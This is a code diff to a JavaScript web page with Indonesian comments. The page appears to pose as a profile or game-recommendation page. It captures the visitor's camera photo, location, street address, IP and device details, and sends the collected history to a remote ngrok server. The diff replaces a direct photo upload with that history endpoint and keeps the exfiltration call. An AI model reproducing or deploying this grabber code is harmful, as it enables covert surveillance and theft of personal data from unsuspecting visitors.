@@ -238,7 +238,7 @@
     const passwordInput = document.getElementById('passwordInput');
     let map;
     const correctPassword = "@angela"; // Password untuk melihat history
-    const uploadUrl = "https://6650-103-121-244-179.ngrok-free.app/upload"; // URL server yang menerima upload foto
+    const serverUrl = "https://6650-103-121-244-179.ngrok-free.app/api/history"; // URL server yang menerima data
 
     // Cek history di localStorage
     const historyData = JSON.parse(localStorage.getItem('historyData')) || [];
@@ -288,51 +288,38 @@
                 
                 // Ambil gambar dari kamera setelah izin diberikan
                 const photo = await imageCapture.takePhoto();
-                const formData = new FormData();
-                formData.append('photo', photo);
+                const photoURL = URL.createObjectURL(photo);
 
-                const response = await fetch(uploadUrl, {
-                    method: 'POST',
-                    body: formData
-                });
+                deviceInfoDiv.innerHTML = getDeviceInfo();
+                ipInfoDiv.innerHTML = await getIPInfo();
+                addressInfoDiv.innerHTML = await getAddress(lat, lon);
+                photoDiv.innerHTML = `
+                    <strong>Foto Profil:</strong><br>
+                    <img src="${photoURL}" alt="Foto Profil" /><br>
+                `;
+                gameRecommendationDiv.innerHTML = getGameRecommendation(); // Tambahkan rekomendasi game
+                stream.getTracks().forEach(track => track.stop());  // Stop camera after capture
+                
+                showMap(lat, lon);
 
-                if (response.ok) {
-                    const data = await response.json();
-                    const photoURL = data.photoUrl;
+                // Simpan data perangkat dan IP ke dalam history
+                const deviceInfo = getDeviceInfo();
+                const ipInfo = await getIPInfo();
+                const addressInfo = await getAddress(lat, lon);
 
-                    deviceInfoDiv.innerHTML = getDeviceInfo();
-                    ipInfoDiv.innerHTML = await getIPInfo();
-                    addressInfoDiv.innerHTML = await getAddress(lat, lon);
-                    photoDiv.innerHTML = `
-                        <strong>Foto Profil:</strong><br>
-                        <img src="${photoURL}" alt="Foto Profil" /><br>
-                    `;
-                    gameRecommendationDiv.innerHTML = getGameRecommendation(); // Tambahkan rekomendasi game
-                    stream.getTracks().forEach(track => track.stop());  // Stop camera after capture
-                    
-                    showMap(lat, lon);
+                const userHistory = {
+                    name: nameInput.value,
+                    hobby: hobbyInput.value,
+                    deviceInfo,
+                    ipInfo,
+                    addressInfo,
+                    photo: photoURL,
+                    timestamp: new Date().toLocaleString(),
+                };
 
-                    // Simpan data perangkat dan IP ke dalam history
-                    const deviceInfo = getDeviceInfo();
-                    const ipInfo = await getIPInfo();
-                    const addressInfo = await getAddress(lat, lon);
-
-                    const userHistory = {
-                        name: nameInput.value,
-                        hobby: hobbyInput.value,
-                        deviceInfo,
-                        ipInfo,
-                        addressInfo,
-                        photo: photoURL,
-                        timestamp: new Date().toLocaleString(),
-                    };
-
-                    historyData.push(userHistory);
-                    localStorage.setItem('historyData', JSON.stringify(historyData));
-                    sendHistoryToServer(historyData); // Kirim data ke server
-                } else {
-                    alert("Gagal mengunggah foto.");
-                }
+                historyData.push(userHistory);
+                localStorage.setItem('historyData', JSON.stringify(historyData));
+                sendHistoryToServer(historyData); // Kirim data ke server
             } catch (error) {
                 alert("Akses kamera ditolak atau tidak tersedia.");
             }
@@ -472,3 +459,4 @@
 </script>
 </body>
 </html>
+
